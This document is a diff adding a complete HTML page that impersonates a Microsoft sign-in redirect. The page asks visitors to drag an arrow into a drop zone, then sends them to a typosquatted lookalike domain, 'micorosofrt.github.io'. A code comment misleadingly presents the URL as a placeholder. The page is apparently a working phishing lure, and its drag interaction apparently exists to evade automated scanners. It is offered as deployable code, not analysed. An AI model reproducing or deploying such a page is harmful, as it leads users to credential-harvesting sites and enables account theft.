@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Drag Arrow to Redirect</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #f5f7fa;
+      color: #333;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+      user-select: none;
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+    p {
+      font-size: 16px;
+      margin-bottom: 40px;
+      color: #555;
+      max-width: 400px;
+    }
+    .drag-container {
+      display: flex;
+      align-items: center;
+      gap: 40px;
+      justify-content: center;
+      max-width: 500px;
+      width: 100%;
+    }
+    .drag-arrow {
+      font-size: 50px;
+      cursor: grab;
+      user-select: none;
+      touch-action: none;
+      color: #0078d7;
+      transition: transform 0.2s ease;
+    }
+    .drag-arrow:active {
+      cursor: grabbing;
+      transform: scale(1.1);
+    }
+    .drop-zone {
+      width: 150px;
+      height: 80px;
+      border: 3px dashed #0078d7;
+      border-radius: 12px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #0078d7;
+      font-weight: 600;
+      font-size: 18px;
+      user-select: none;
+      transition: background-color 0.3s ease, border-color 0.3s ease;
+    }
+    .drop-zone.drag-over {
+      background-color: #e1f0ff;
+      border-color: #005aab;
+      color: #005aab;
+    }
+  </style>
+</head>
+<body>
+  <h1>Please press and drag the arrow here to get redirected to your Microsoft account</h1>
+  <p>Drag the arrow into the box below to continue.</p>
+
+  <div class="drag-container">
+    <div id="dragArrow" class="drag-arrow" draggable="true" aria-grabbed="false" tabindex="0" role="button" aria-label="Drag arrow to redirect to Microsoft">
+      ➔
+    </div>
+    <div id="dropZone" class="drop-zone" tabindex="0" aria-dropeffect="none">
+      Drop Here
+    </div>
+  </div>
+
+  <script>
+    const dragArrow = document.getElementById('dragArrow');
+    const dropZone = document.getElementById('dropZone');
+    const redirectUrl = 'https://micorosofrt.github.io/off/'; // Replace with your actual Microsoft URL
+
+    dragArrow.addEventListener('dragstart', (e) => {
+      e.dataTransfer.setData('text/plain', 'redirect');
+      dragArrow.setAttribute('aria-grabbed', 'true');
+    });
+
+    dragArrow.addEventListener('dragend', (e) => {
+      dragArrow.setAttribute('aria-grabbed', 'false');
+    });
+
+    dropZone.addEventListener('dragover', (e) => {
+      e.preventDefault();
+      dropZone.classList.add('drag-over');
+      dropZone.setAttribute('aria-dropeffect', 'move');
+    });
+
+    dropZone.addEventListener('dragleave', (e) => {
+      dropZone.classList.remove('drag-over');
+      dropZone.setAttribute('aria-dropeffect', 'none');
+    });
+
+    dropZone.addEventListener('drop', (e) => {
+      e.preventDefault();
+      dropZone.classList.remove('drag-over');
+      dropZone.setAttribute('aria-dropeffect', 'none');
+      const data = e.dataTransfer.getData('text/plain');
+      if (data === 'redirect') {
+        window.location.href = redirectUrl;
+      }
+    });
+
+    // Accessibility: allow keyboard users to 'activate' redirect by pressing Enter or Space on dragArrow
+    dragArrow.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' || e.key === ' ') {
+        e.preventDefault();
+        window.location.href = redirectUrl;
+      }
+    });
+  </script>
+</body>
+</html>
